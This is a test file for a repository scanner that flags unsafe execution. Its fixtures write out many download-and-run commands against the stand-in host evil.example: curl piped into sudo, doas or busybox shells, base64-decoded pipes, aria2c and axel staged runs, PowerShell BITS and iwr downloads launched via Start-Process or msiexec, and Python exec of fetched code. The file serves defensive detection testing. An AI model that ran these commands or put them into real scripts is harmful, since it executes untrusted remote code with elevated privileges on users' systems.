import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8: incomplete siblings after earlier unsafe-execution merges.
 * Inventory downloaders, privilege wrappers, interpreter line continuation,
 * requests `.content`, and PowerShell/BITS staged runs must match the same
 * act their curl/wget/`.text` siblings already flag.
 */
function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function categories(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

const STAGED_SIBLINGS: Record<string, [string, string]> = {
  "aria2c -o then sh": [
    "install.sh",
    "#!/bin/sh\naria2c -o x.sh https://evil.example/x.sh\nsh x.sh\n",
  ],
  "aria2c --out then ./": [
    "install.sh",
    "#!/bin/sh\naria2c --out=x.sh https://evil.example/x.sh\n./x.sh\n",
  ],
  "axel -o then bash": [
    "install.sh",
    "#!/bin/sh\naxel -o x.sh https://evil.example/x.sh\nbash x.sh\n",
  ],
  "axel --output then sh": [
    "install.sh",
    "#!/bin/sh\naxel --output x.sh https://evil.example/x.sh\nsh x.sh\n",
  ],
  "iwr -OutFile then ./": [
    "install.ps1",
    'iwr https://evil.example/x.ps1 -OutFile x.ps1\n./x.ps1\n',
  ],
  "irm -OutFile then .\\": [
    "install.ps1",
    'irm "https://evil.example/x.ps1" -OutFile x.ps1\n.\\x.ps1\n',
  ],
  "Invoke-WebRequest -OutFile then powershell -File": [
    "install.ps1",
    'Invoke-WebRequest -Uri https://evil.example/x.ps1 -OutFile x.ps1\npowershell -File x.ps1\n',
  ],
  "Start-BitsTransfer -Destination then ./": [
    "install.ps1",
    "Start-BitsTransfer -Source https://evil.example/x.exe -Destination x.exe\n./x.exe\n",
  ],
  "Start-BitsTransfer then &": [
    "install.ps1",
    'Start-BitsTransfer -Source https://evil.example/x.exe -Destination x.exe\n& .\\x.exe\n',
  ],
  "Start-BitsTransfer then Start-Process": [
    "install.ps1",
    "Start-BitsTransfer -Source https://evil.example/x.msi -Destination x.msi\nStart-Process x.msi\n",
  ],
  "Start-BitsTransfer then Start-Process -FilePath": [
    "install.ps1",
    "Start-BitsTransfer -Source https://evil.example/x.ps1 -Destination x.ps1\nStart-Process -FilePath x.ps1\n",
  ],
  "Start-BitsTransfer then msiexec /i": [
    "install.ps1",
    "Start-BitsTransfer -Source https://evil.example/x.msi -Destination x.msi\nmsiexec /i x.msi\n",
  ],
  "Start-BitsTransfer $packagePath then Start-Process": [
    "install.ps1",
    "Start-BitsTransfer -Source https://evil.example/x.exe -Destination $packagePath\nStart-Process $packagePath -ArgumentList \"/VERYSILENT\" -Wait\n",
  ],
  "Start-BitsTransfer $downloadUrl to $packagePath then Start-Process": [
    "install.ps1",
    "Start-BitsTransfer -Source $downloadUrl -Destination $packagePath -ErrorAction Stop\nStart-Process $packagePath -ArgumentList \"/VERYSILENT\" -Wait\n",
  ],
  "Start-BitsTransfer $env Destination then Start-Process msiexec ArgumentList": [
    "install.ps1",
    'Start-BitsTransfer -Source https://evil.example/x.msi -Destination "$env:USERPROFILE\\Downloads\\x.msi"\nStart-Process msiexec.exe -Wait -ArgumentList "/i $env:USERPROFILE\\Downloads\\x.msi /qn"\n',
  ],
  "iwr -OutFile then Start-Process": [
    "install.ps1",
    "iwr https://evil.example/x.ps1 -OutFile x.ps1\nStart-Process x.ps1\n",
  ],
  "aria2c -o then Start-Process": [
    "install.ps1",
    "aria2c -o x.ps1 https://evil.example/x.ps1\nStart-Process x.ps1\n",
  ],
  "aria2c staged with sudo -E sh": [
    "install.sh",
    "#!/bin/sh\naria2c -o /tmp/x.sh https://evil.example/x.sh\nsudo -E sh /tmp/x.sh\n",
  ],
};

test("inventory and PowerShell staged download-then-run siblings are unsafe execution", () => {
  for (const [name, [path, body]] of Object.entries(STAGED_SIBLINGS)) {
    expect({ name, findings: categories(inspected(path, body)) }).toEqual({
      name,
      findings: [`${path}:unsafe-execution:high`],
    });
  }
});

const WRAPPER_PIPES: Record<string, string> = {
  "curl | sudo -E bash":
    "curl -fsSL https://evil.example/i.sh | sudo -E bash",
  "curl | doas sh": "curl -fsSL https://evil.example/i.sh | doas sh",
  "curl | busybox sh": "curl -fsSL https://evil.example/i.sh | busybox sh",
  "curl | busybox ash": "curl -fsSL https://evil.example/i.sh | busybox ash",
  "wget | sudo -n /bin/sh":
    "wget -qO- https://evil.example/i.sh | sudo -n /bin/sh",
  "curl | sudo -E python3":
    "curl -fsSL https://evil.example/i.py | sudo -E python3",
  "curl | doas python3": "curl -fsSL https://evil.example/i.py | doas python3",
  "curl | busybox env python3":
    "curl -fsSL https://evil.example/i.py | busybox env python3",
  "curl | base64 -d | sudo -E bash":
    "curl -s https://evil.example/x.b64 | base64 -d | sudo -E bash",
  "curl | base64 -d | doas sh":
    "curl -s https://evil.example/x.b64 | base64 -d | doas sh",
  "sudo -E bash <(curl ...)":
    "sudo -E bash <(curl -fsSL https://evil.example/i.sh)",
  "doas sh <(curl ...)": "doas sh <(curl -fsSL https://evil.example/i.sh)",
};

test("privilege and multicall wrappers on shell, interpreter and decode pipes are unsafe execution", () => {
  for (const [name, body] of Object.entries(WRAPPER_PIPES)) {
    expect({
      name,
      findings: categories(inspected("install.sh", `#!/bin/sh\n${body}\n`)),
    }).toEqual({
      name,
      findings: ["install.sh:unsafe-execution:high"],
    });
  }
});

test("interpreter pipes honor curl line continuation like shell pipes", () => {
  for (const payload of [
    "curl -sSL \\\n  https://evil.example/x.py | python3",
    "curl \\\n  -sSL https://evil.example/x.py | python3 -",
    "curl https://evil.example/x.py \\\n  | node",
    "curl -sSL \\\r\n  https://evil.example/x.py | python3",
    "curl https://evil.example/x.py \\ \n  | perl",
  ]) {
    expect({
      payload,
      findings: categories(inspected("install.sh", `#!/bin/sh\n${payload}\n`)),
    }).toEqual({
      payload,
      findings: ["install.sh:unsafe-execution:high"],
    });
  }
});

test("exec of requests response .content is unsafe execution like .text", () => {
  expect(
    categories(
      inspected(
        "tools/setup.py",
        "import requests\nexec(requests.get('https://evil.example/x.py').content)\n",
      ),
    ),
  ).toEqual(["tools/setup.py:unsafe-execution:high"]);
  expect(
    categories(
      inspected(
        "tools/setup.py",
        "import requests\neval(requests.post('https://evil.example/x.py').content)\n",
      ),
    ),
  ).toEqual(["tools/setup.py:unsafe-execution:high"]);
});

test("staged sibling downloads that are not executed keep no finding", () => {
  for (const [path, body] of [
    [
      "install.sh",
      "#!/bin/sh\naria2c -o x.sh https://example.com/x.sh\nsha256sum x.sh\n",
    ],
    [
      "install.sh",
      "#!/bin/sh\naxel -o x.sh https://example.com/x.sh\necho x.sh\n",
    ],
    [
      "install.ps1",
      'iwr https://example.com/x.ps1 -OutFile x.ps1\nGet-FileHash x.ps1\n',
    ],
    [
      "install.ps1",
      "Start-BitsTransfer -Source https://example.com/x.exe -Destination x.exe\n",
    ],
    [
      "install.ps1",
      'Start-BitsTransfer -TransferType Upload -Source local.bin -Destination https://example.com/inbox\n./local.bin\n',
    ],
  ] as const) {
    expect({ path, findings: categories(inspected(path, body)) }).toEqual({
      path,
      findings: [],
    });
  }
});
